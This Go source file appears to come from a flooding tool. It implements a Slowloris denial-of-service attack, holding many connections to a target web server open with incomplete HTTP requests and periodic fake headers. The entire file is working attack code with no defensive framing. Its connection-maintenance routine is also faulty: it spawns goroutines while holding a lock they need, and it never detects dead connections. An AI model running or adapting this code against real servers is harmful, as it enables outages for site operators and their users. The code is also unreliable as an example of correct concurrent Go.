// pkg/attacker/slowloris.go
package attacker

import (
    "net"
    "net/http"
    "sync"
    "time"

    "github.com/stresstest/layer7-flood/pkg/config"
    "github.com/stresstest/layer7-flood/pkg/stats"
    "github.com/stresstest/layer7-flood/pkg/utils"
)

type Slowloris struct {
    cfg     *config.Config
    stats   *stats.Collector
    conns   []net.Conn
    mu      sync.Mutex
    stopCh  chan struct{}
}

func NewSlowloris(cfg *config.Config, stats *stats.Collector) *Slowloris {
    return &Slowloris{
        cfg:    cfg,
        stats:  stats,
        conns:  make([]net.Conn, 0),
        stopCh: make(chan struct{}),
    }
}

func (s *Slowloris) Start() {
    // Initial connection flood
    for i := 0; i < s.cfg.Attack.Threads; i++ {
        go s.openConnection(i)
    }
    
    // Keep-alive maintenance
    ticker := time.NewTicker(10 * time.Second)
    defer ticker.Stop()
    
    for {
        select {
        case <-s.stopCh:
            return
        case <-ticker.C:
            s.maintainConnections()
        }
    }
}

func (s *Slowloris) openConnection(id int) {
    conn, err := net.DialTimeout("tcp", s.cfg.Target.Host, 5*time.Second)
    if err != nil {
        return
    }
    
    request := "GET /?" + utils.RandomString(16) + " HTTP/1.1\r\n" +
        "Host: " + s.cfg.Target.Hostname + "\r\n" +
        "User-Agent: " + utils.RandomUserAgent() + "\r\n"
    
    conn.Write([]byte(request))
    
    s.mu.Lock()
    s.conns = append(s.conns, conn)
    s.mu.Unlock()
    
    // Keep sending partial headers
    ticker := time.NewTicker(15 * time.Second)
    defer ticker.Stop()
    
    for {
        select {
        case <-s.stopCh:
            conn.Close()
            return
        case <-ticker.C:
            partial := "X-Random-" + utils.RandomString(8) + ": " + utils.RandomString(12) + "\r\n"
            conn.Write([]byte(partial))
            s.stats.RecordSlowlorisKeepalive()
        }
    }
}

func (s *Slowloris) maintainConnections() {
    s.mu.Lock()
    defer s.mu.Unlock()
    
    // Prune dead connections and add new ones
    active := make([]net.Conn, 0)
    for _, conn := range s.conns {
        if conn != nil {
            active = append(active, conn)
        }
    }
    s.conns = active
    
    // Refill to target count
    target := s.cfg.Attack.Threads
    for len(s.conns) < target {
        go s.openConnection(len(s.conns))
    }
}

func (s *Slowloris) Stop() {
    close(s.stopCh)
    s.mu.Lock()
    defer s.mu.Unlock()
    for _, conn := range s.conns {
        if conn != nil {
            conn.Close()
        }
    }
}
